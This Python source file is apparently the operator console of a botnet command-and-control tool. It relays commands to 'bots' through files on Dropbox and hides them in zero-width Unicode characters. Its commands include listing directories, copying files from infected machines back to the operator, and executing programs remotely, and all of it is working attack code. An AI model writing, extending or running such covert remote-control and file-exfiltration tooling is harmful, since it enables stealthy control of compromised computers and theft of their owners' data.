import dropbox
import threading
import time
from pathlib import Path

TOKEN = ''
INTERVAL = 30

heartbeat_file = "heartbeat.txt"
command_file = "command.txt"
response_file = "response.txt"

dbx = dropbox.Dropbox(TOKEN)

commands = {
    "w": False,
    "ls": True,
    "id": False,
    "cp": True,
    "exe": True
}
last_command = None
last_param = None


# inspired by https://github.com/koustubh1317/Steganography-Tools
def encode(text):
    ZWC = {"00": u'\u200C', "01": u'\u202C', "11": u'\u202D', "10": u'\u200E'}
    res = ""
    # print("encoding " + text)
    for ch in text:
        binary = format(ord(ch), 'b').zfill(8)
        # print(binary)
        for i in range(0, 8, 2):
            res += ZWC[binary[i:i + 2]]
    # print("res", res, len(res))
    return res


# inspired by https://github.com/koustubh1317/Steganography-Tools
def decode(text):
    ZWC = {u'\u200C': "00", u'\u202C': "01", u'\u202D': "11", u'\u200E': "10"}
    res = ""
    # print("decoding", text, len(text))
    for i in range(0, len(text), 4):
        binary = ""
        for e in text[i:i + 4]:
            binary += ZWC[e]
        # print(binary)
        res += chr(int(binary, 2))
    # print("res", res)
    return res


def upload(name):
    with open(name, "rb") as file:
        dbx.files_upload(
            file.read(),
            "/" + name,
            dropbox.files.WriteMode.overwrite,
            mute=True
        )


def download(name):
    try:
        md, res = dbx.files_download("/" + name)
    except dropbox.exceptions.ApiError as err:
        print('*** API error', err)
        return
    data = res.content
    with open(name, "wb+") as file:
        file.write(data)


def check_heartbeat():
    duration = 0
    while True:
        open(heartbeat_file, "w").close()
        upload(heartbeat_file)
        time.sleep(INTERVAL - duration)
        start = time.time()
        download(heartbeat_file)
        print("\nAvailable bots:", end=" ")
        with open(heartbeat_file, "r", encoding="utf-8") as file:
            print(decode(file.read()).strip().replace("\n", ", "))
        if last_command is None:
            print("Command:", end=" ")
        elif last_param is None:
            print("Parameter:", end=" ")
        duration = time.time() - start


def send_command(cmd, param):
    open(response_file, "w").close()
    upload(response_file)
    with open(command_file, "w", encoding="utf-8") as file:
        file.write(encode(cmd + " " + param))
    upload(command_file)


def get_response():
    open(command_file, "w").close()
    upload(command_file)
    download(response_file)
    with open(response_file, "r", encoding="utf-8") as file:
        res = decode(file.read())
    if last_command == "cp":
        for msg in res.split(u'\u0003'):
            if len(msg) > 0:
                data = msg.split(u'\u0002', 1)
                bot = data[0]
                content = data[1]
                path = Path(last_param)
                file_name = path.stem + "_" + bot + path.suffix
                print("saving response to file", file_name)
                with open(file_name, "w+", encoding="utf-8") as file:
                    file.write(content)
    else:
        print(res)




def create_files():
    open(heartbeat_file, "w+").close()
    upload(heartbeat_file)
    open(command_file, "w+").close()
    upload(command_file)
    open(response_file, "w+").close()
    upload(response_file)


if __name__ == '__main__':
    create_files()
    heartbeat_thread = threading.Thread(target=check_heartbeat)
    heartbeat_thread.start()
    while True:
        last_command = None
        last_param = None
        cmd = input("Command: ")
        last_command = cmd
        param = ""
        if cmd not in commands.keys():
            print("Invalid command. Available are:", ", ".join(list(commands.keys())))
            continue
        if commands[cmd]:
            param = input("Parameter: ")
        last_param = param
        send_command(cmd, param)
        print("Sent request, waiting for response...")
        time.sleep(INTERVAL)
        print("Response:")
        get_response()